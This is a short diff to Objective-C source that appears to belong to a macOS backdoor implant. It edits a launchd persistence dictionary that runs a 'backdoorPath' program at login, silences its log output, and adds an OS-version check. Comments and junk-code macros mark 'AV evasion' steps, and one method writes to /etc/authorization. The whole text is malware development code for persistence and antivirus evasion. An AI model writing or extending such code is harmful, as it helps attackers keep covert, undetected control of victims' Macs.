@@ -338,9 +338,10 @@ static __m_MUtils *sharedUtils = nil;
     [[NSDictionary alloc] initWithObjectsAndKeys:aLabel, @"Label",
                                                  @"Aqua", @"LimitLoadToSessionType",
                                                  [NSNumber numberWithBool: FALSE], @"OnDemand",
+                                                [[NSBundle mainBundle] bundlePath], @"WorkingDirectory",
                                                  [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
-                                                 errorLog, @"StandardErrorPath",
-                                                 outLog, @"StandardOutPath",
+                                                 //errorLog, @"StandardErrorPath",
+                                                 //outLog, @"StandardOutPath",
                                                  nil];
   
   // AV evasion: only on release build
@@ -858,6 +859,8 @@ static __m_MUtils *sharedUtils = nil;
                      atPath: @"/etc/authorization"];
 }
 
+
+
 - (BOOL)isMtLion
 {  // AV evasion: only on release build
   AV_GARBAGE_001
@@ -866,6 +869,13 @@ static __m_MUtils *sharedUtils = nil;
     return YES;
   
   return NO;
+}
+
+- (BOOL)isMaverics
+{
+	if (gOSMajor == 10 && gOSMinor == 9)
+		return YES;
+	return NO;
 }
 
 - (BOOL)isLion
